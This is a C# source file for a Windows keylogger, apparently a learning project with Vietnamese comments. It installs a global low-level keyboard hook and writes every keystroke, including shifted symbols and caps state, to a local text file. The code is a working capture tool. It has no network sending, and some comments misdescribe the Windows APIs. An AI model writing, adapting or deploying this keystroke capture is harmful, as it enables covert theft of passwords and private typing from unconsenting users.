using System;
using System.Diagnostics;
using System.Timers;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Text;
using Microsoft.Win32;

namespace KeyLogger
{
    class appstart // khởi tạo 1 class appstart
    {
        public static string str; // tạo lớp tỉnh str
        static ASCIIEncoding encoding = new ASCIIEncoding(); // tạo 1 lớp tỉnh ASCIIEncoding encoding mục đích để cài đặt biểu diễn chỗi ký tự dưới dạng mã ASCII
        public static string path = "fileKeyLog.txt";// tạo lớp tỉnh path với chuôi là fileKeyLog.txt
        public static byte caps = 0, shift = 0, failed = 0; // tạo các lớp tỉnh với kiểu byte caps = 0, shift = 0, failed = 0
        public static void OnTimedEvent(object source, EventArgs e) // là hàm trả kết quả
                                                                    //object là hà hỗ trợ các class trong .NET theo phân cấp và cung cấp dịch vụ thấp để truy ra nguồn gốc cua class. nó là class cơ bản cuối cùng trong tất cả các class .NET.
                                                                    // đó là nguồn gốc của loại hệ thống phân cấp loại hệ thống phân cấploại hệ thống phân cấp
        {                                                           //Object dùng để tham chiếu biến source
        } //end of the OnTimedEvent method 
        public static string strLog() //strLog là một lớp tinh được khởi tạo với kiểu string
        {
            str = File.ReadAllText(appstart.path, encoding); //File là một class System cung cấp các phương thức khởi tạo tỉnh, copy, delete, moving và mở 1 file độc lập

            // và hỗ trợ khởi tạo FileStream Objects
            // ReadAllText là mở file, đọc file với mã hóa đặc biệt và sau đó đóng file lại
            return str;
        }
    }//end of the appstart class
    class InterceptKeys
    {

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)] // Chỉ ra rằng phương thức được quy cho được hiển thị bởi thư viện liên kết động - không được quản lý ( DLL ) dưới dạng điểm nhập tĩnh.
                                                                               // import user32.dll vào system32
                                                                               // Indicates whether the callee sets an error (SetLastError on Windows or errno on other platforms) before returning from the attributed method.
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId); // extern được sử dụng như 1 phương thức công khai, được thực thi ở bên ngoài
                                                                                                                            //IntPtr là 1 flatform đặc biệt dùng để biểu diễn 1 gợi ý hoặc 1 handle
                                                                                                                            // kiểu uint là số nguyên không được ký hiệu

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
       // import user32.dll vào system32
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);//tạo CallNextHookEx bao gồm các flagform đặc biệt dùng để biểu diễn 1 gợi ý hoặc 1 handle với biến hhk, wParam, lParam và nCode với kiểu số nguyên

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName); // hàm GetModuleHandle với kiểu dữ liệu của biến lpModuleName là string

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero; // Zero là 1 kiểu chỉ đọc biểu diễn 1 điểm or 1 handle đã được cài đặt là số 0
        public static void startKLog()
        {
            _hookID = SetHook(_proc); //với _hookID = SetHook(_proc) thì Application sẽ khởi chạy
            Application.Run();
            UnhookWindowsHookEx(_hookID); //  UnhookWindowsHookEx sẽ trả về kiểu bool với giá trị của _hookID
        }
        private static IntPtr SetHook(LowLevelKeyboardProc proc) //SetHook là struct tỉnh với biến là LowLevelKeyboardProc
        {
            using (Process curProcess = Process.GetCurrentProcess())
            //statement using dùng để cung cấp một cái cú pháp tiện lợi nhằm đảm bảo rằng cho việc sử dụng
            //chính xác IDisposable objects và IAsyncDisposable
            //curProcess sẽ truy cập vào tiến tình cục bộ và tiến tình từ xa sau đó khởi chạy hoặc dừng chương trình đang hoạt động
            using (ProcessModule curModule = curProcess.MainModule) //curModule sẽ biểu diễn dưới dạng .dll hoặc excel khi một chương trình riêng biệt đã được load
            {                                                       //MainModule là 1 ProccessModule dùng để để lấy module chính cho chương trìn đã liên kết và trả về kết quả
                                                                    //là  SetWindowsHookEx WH_KEYBOARD_LL = 13, proc, GetModuleHandle với curModule là tên của tiến trình module
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }
        


        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)//nếu nCode >= 0 và wParam = WM_KEYDOWN thì 
            {
                StreamWriter sw = File.AppendText(appstart.path); //sw dưới dạng TextWriter với appstart.path là một streamwriter, kết quả trả về sẽ là 1 file text đặc biệt hoặc một file mới
                int vkCode = Marshal.ReadInt32(lParam);
                if (Keys.Shift == Control.ModifierKeys) appstart.shift = 1; //Keys.Shift == Control.ModifierKeys) appstart.shift = 1
                switch ((Keys)vkCode)
                { //xét các trường hợp trả về kết quả là các ký tự của phím chức năng tương ứng
                    case Keys.Space:
                        sw.Write(" ");
                        break;
                    case Keys.Return:
                        sw.WriteLine("Enter");
                        break;
                    case Keys.Back:
                        sw.Write("Backspace");
                        break;
                    case Keys.Tab:
                        sw.Write("Tab");
                        break;
                    case Keys.D0:
                        if (appstart.shift == 0) sw.Write("0");
                        else sw.Write(")");
                        break;
                    case Keys.D1:
                        if (appstart.shift == 0) sw.Write("1");
                        else sw.Write("!");
                        break;
                    case Keys.D2:
                        if (appstart.shift == 0) sw.Write("2");
                        else sw.Write("@");
                        break;
                    case Keys.D3:
                        if (appstart.shift == 0) sw.Write("3");
                        else sw.Write("#");
                        break;
                    case Keys.D4:
                        if (appstart.shift == 0) sw.Write("4");
                        else sw.Write("$");
                        break;
                    case Keys.D5:
                        if (appstart.shift == 0) sw.Write("5");
                        else sw.Write("%");
                        break;
                    case Keys.D6:
                        if (appstart.shift == 0) sw.Write("6");
                        else sw.Write("^");
                        break;
                    case Keys.D7:
                        if (appstart.shift == 0) sw.Write("7");
                        else sw.Write("&");
                        break;
                    case Keys.D8:
                        if (appstart.shift == 0) sw.Write("8");
                        else sw.Write("*");
                        break;
                    case Keys.D9:
                        if (appstart.shift == 0) sw.Write("9");
                        else sw.Write("(");
                        break;
                    case Keys.LShiftKey: /* case Keys.LShiftKey
                                          * case Keys.RShiftKey:
                                            case Keys.LControlKey:
                                            case Keys.RControlKey:
                                            case Keys.LMenu:
                                            case Keys.RMenu:
                                            case Keys.LWin:
                                            case Keys.RWin:
                                            case Keys.Apps
                        là các phím chức năng này là các pressed state
                                          */
                    case Keys.RShiftKey:
                    case Keys.LControlKey:
                    case Keys.RControlKey:
                    case Keys.LMenu:
                    case Keys.RMenu:
                    case Keys.LWin:
                    case Keys.RWin:
                    case Keys.Apps:
                        sw.Write("");
                        break;
                    case Keys.OemQuestion:
                        if (appstart.shift == 0) sw.Write("/");
                        else sw.Write("?");
                        break;
                    case Keys.OemOpenBrackets:
                        if (appstart.shift == 0) sw.Write("[");
                        else sw.Write("{");
                        break;
                    case Keys.OemCloseBrackets:
                        if (appstart.shift == 0) sw.Write("]");
                        else sw.Write("}");
                        break;
                    case Keys.Oem1:
                        if (appstart.shift == 0) sw.Write(";");
                        else sw.Write(":");
                        break;
                    case Keys.Oem7:
                        if (appstart.shift == 0) sw.Write("'");
                        else sw.Write('"');
                        break;
                    case Keys.Oemcomma:
                        if (appstart.shift == 0) sw.Write(",");
                        else sw.Write("<");
                        break;
                    case Keys.OemPeriod:
                        if (appstart.shift == 0) sw.Write(".");
                        else sw.Write(">");
                        break;
                    case Keys.OemMinus:
                        if (appstart.shift == 0) sw.Write("-");
                        else sw.Write("_");
                        break;
                    case Keys.Oemplus:
                        if (appstart.shift == 0) sw.Write("=");
                        else sw.Write("+");
                        break;
                    case Keys.Oemtilde:
                        if (appstart.shift == 0) sw.Write("`");
                        else sw.Write("~");
                        break;
                    case Keys.Oem5:
                        sw.Write("|");
                        break;
                    case Keys.Capital:
                        if (appstart.caps == 0) appstart.caps = 1;
                        else appstart.caps = 0;
                        break;
                    default:
                        if (appstart.shift == 0 && appstart.caps == 0) sw.Write(((Keys)vkCode).ToString().ToLower());
                        if (appstart.shift == 1 && appstart.caps == 0) sw.Write(((Keys)vkCode).ToString().ToUpper());
                        if (appstart.shift == 0 && appstart.caps == 1) sw.Write(((Keys)vkCode).ToString().ToUpper());
                        if (appstart.shift == 1 && appstart.caps == 1) sw.Write(((Keys)vkCode).ToString().ToLower());
                        break;
                } //end of switch
                appstart.shift = 0;
                sw.Close();
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        } //end of HookCallback method
    }
}